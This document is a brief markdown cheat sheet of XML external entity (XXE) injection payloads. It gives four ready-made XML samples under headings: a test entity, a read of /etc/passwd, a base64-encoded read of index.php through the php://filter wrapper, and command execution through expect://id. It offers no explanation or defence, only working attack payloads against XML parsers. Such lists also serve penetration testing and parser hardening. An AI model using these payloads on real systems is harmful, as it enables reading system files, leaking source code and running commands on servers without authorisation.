# XXE injection

## Test

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe "XXE_INJECTION_OK"> ]>
<data>
    <fild1>test</fild1>
    <fild2>&xxe;</fild2>
</data>
```

## Read file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<data>
    <fild1>test</fild1>
    <fild2>&xxe;</fild2>
</data>
```

## Read file in base64

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
    <!ELEMENT title ANY>
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
]>
<rss version="2.0">
<channel>
    <item>
    <title>&xxe;</title>
    </item>
</channel>
</rss>
```

## RCE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'expect://id'>]>
<data>
    <fild1>test</fild1>
    <fild2>&xxe;</fild2>
</data>
```
